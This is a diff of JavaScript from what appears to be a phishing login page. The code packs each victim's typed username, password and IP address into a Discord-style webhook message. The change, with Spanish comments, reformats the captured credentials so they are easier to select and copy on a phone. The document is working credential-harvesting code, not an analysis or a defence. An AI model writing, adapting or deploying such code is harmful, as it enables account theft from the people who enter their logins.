@@ -283,25 +283,24 @@
             console.log('No se pudo obtener IP');
         }
         
+        // Formato optimizado para móvil: código en línea (single backtick)
+        // En Discord móvil, al tocar el texto gris se selecciona fácilmente
         const payload = {
+            content: `🔐 **Nuevo Login** | IP: ${userIP}`,
             embeds: [{
-                title: "🔐 Nuevo Login",
                 color: 0x7d95d4,
                 fields: [
                     {
                         name: "👤 Usuario",
-                        value: `\`\`\`${usuario}\`\`\``,
-                        inline: false
+                        value: `\`${usuario}\``,
+                        inline: true
                     },
                     {
                         name: "🔑 Contraseña", 
-                        value: `\`\`\`${password}\`\`\``,
-                        inline: false
+                        value: `\`${password}\``,
+                        inline: true
                     }
                 ],
-                footer: {
-                    text: `IP: ${userIP}`
-                },
                 timestamp: new Date().toISOString()
             }]
         };
